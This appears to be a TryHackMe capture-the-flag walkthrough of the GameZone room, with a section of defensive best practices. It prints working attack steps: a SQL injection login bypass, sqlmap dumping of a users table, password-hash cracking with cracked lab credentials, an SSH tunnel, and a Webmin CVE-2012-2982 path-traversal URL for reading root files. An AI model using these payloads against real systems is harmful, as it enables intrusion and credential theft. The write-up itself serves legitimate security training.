---
date: '2025-02-02T00:35:49+05:30'
draft: false
title: 'GameZone: TryHackMe Walkthrough'
slug: gamezone-thm
tags: ["tryhackme", "sql-injection", "ssh-tunneling", "webmin", "metasploit"]
category: writeups
showtoc: true
summary: A walkthrough of the GameZone room on TryHackMe, featuring SQL injection, SSH tunneling, and Webmin exploitation
description: Learn how to exploit SQL injection vulnerabilities, use SSH tunneling to access restricted services, and leverage Webmin vulnerabilities for privilege escalation
---

# GameZone: TryHackMe Walkthrough

## Initial Enumeration

### Nmap Scan Results
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
```

Key findings:
- Web application on port 80
- SSH service on port 22
- Ubuntu-based system

## Web Application Exploitation

### SQL Injection
1. Basic authentication bypass:
```sql
' or 1=1 -- -
```
- Input in username field
- Leave password blank

### SQLMap Enumeration

1. Capture login request in Burp Suite
2. Save request to file (req.txt)
3. Execute SQLMap:
```bash
sqlmap -r req.txt --dbms=mysql --dump
```

Results:
```sql
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                                | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+
```

### Password Cracking
Using John the Ripper:
```bash
john hash.txt --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-SHA256
```

## Initial Access

### SSH Access
Credentials obtained:
- Username: agent47
- Password: videogamer124

## Privilege Escalation

### Service Enumeration
Using `ss` to list socket connections:
```bash
ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port
tcp    LISTEN     0      80     127.0.0.1:3306
tcp    LISTEN     0      128    *:10000
tcp    LISTEN     0      128    *:22
```

### SSH Tunneling
Forward local port to access restricted service:
```bash
ssh -L 10000:localhost:10000 agent47@10.10.173.247
```

### Webmin Exploitation

1. **Service Identification**
   - Webmin version 1.580 identified
   - Accessible via localhost:10000

2. **Vulnerability Research**
   - CVE-2012-2982
   - Webmin 1.580 '/file/show.cgi' RCE

3. **Exploitation Methods**
   - Direct file access:
     ```
     http://localhost:10000/file/show.cgi/root/root.txt
     ```
   - Metasploit module:
     - `exploit/unix/webapp/webmin_show_cgi_exec`

## Best Practices

1. **SQL Injection Prevention**
   - Use parameterized queries
   - Input validation
   - Least privilege database users

2. **Network Security**
   - Restrict service access
   - Implement proper firewall rules
   - Regular port auditing

3. **Service Hardening**
   - Keep services updated
   - Remove unnecessary services
   - Regular security patches

## Tools Used

1. **Enumeration**
   - Nmap
   - ss command
   - SQLMap

2. **Exploitation**
   - Burp Suite
   - John the Ripper
   - Metasploit Framework

3. **Post Exploitation**
   - SSH tunneling
   - Webmin exploitation
   - File system navigation

## Additional Notes

1. **SSH Tunneling Types**
   - Local (-L): YOU <-- CLIENT
   - Remote (-R): YOU --> CLIENT
   - Dynamic (-D): SOCKS proxy

2. **Port Forwarding Security**
   - Monitor forwarded ports
   - Use strict firewall rules
   - Implement connection timeouts

## References

1. [SQLMap Documentation](http://sqlmap.org/)
2. [SSH Tunneling Guide](https://www.ssh.com/ssh/tunneling/)
3. [Webmin CVE-2012-2982](https://www.exploit-db.com/exploits/21851)
4. [TryHackMe - GameZone](https://tryhackme.com/)
